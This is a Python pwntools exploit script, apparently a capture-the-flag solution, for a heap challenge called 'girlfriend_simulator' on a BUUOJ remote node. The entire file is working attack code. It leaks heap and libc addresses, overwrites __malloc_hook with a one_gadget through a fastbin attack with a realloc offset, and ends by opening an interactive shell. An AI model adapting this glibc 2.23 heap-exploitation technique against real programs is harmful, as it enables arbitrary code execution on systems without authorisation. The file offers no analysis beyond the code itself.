#coding:utf-8
import sys
from pwn import *
# context.log_level='debug'
elfelf='./girlfriend_simulator'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',26411)
			elf=ELF(elfelf)
			libc=ELF('./libc-2.23.so')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('>>','1')
			io.sendlineafter('size?',str(a))
			io.sendafter('content:',b)

		def show():
			io.sendlineafter('>>','3')

		def delete():
			io.sendlineafter('>>','2')

		def num(num):
			io.sendlineafter('girlfriend you want ?',str(num))

		def exit():
			io.sendlineafter('>>','5')
		
		'''example
		num(0x28)
		for i in range(0x27):
			add(0x18,'aaaaaaaa')
			delete()
			add(0x18,'aaaaaaaa')
			show()
			io.recvuntil('a'*8)
			heap_base=u64(io.recv(6)+'\x00\x00')
			success('heap_base:'+hex(heap_base))
			exit()
		'''
		num(0x9)
		for i in range(8):
			add(0x18,'aaaaaaaa')
			delete()
			add(0x18,'aaaaaaaa')
			show()
			io.recvuntil('a'*8)
			heap_base=u64(io.recv(6)+'\x00\x00')
			success('heap_base:'+hex(heap_base))
			exit()
		add(0x60,'aaaaaaaa')
		delete()
		exit()
		# delete()
		# exit()
		# delete()
		# add(0x18,p64(heap_base+0x10))
		# add(0x78,'aaa')
		# exit()
		# add(0x18,'aaaaaaaa')

		# show()
		io.recvuntil('0x')
		libc_base=int(io.recv(12),16)-libc.sym['_IO_2_1_stdout_']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		io.sendlineafter('something to impress your girlfriend',p64(libc.sym['__malloc_hook']-0x23))
		io.sendlineafter('by your words','aaaa')
		io.sendlineafter('Questionnaire','\x00'*0xb+p64(libc_base+0x4526a)+p64(libc.sym['realloc']+2))


		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue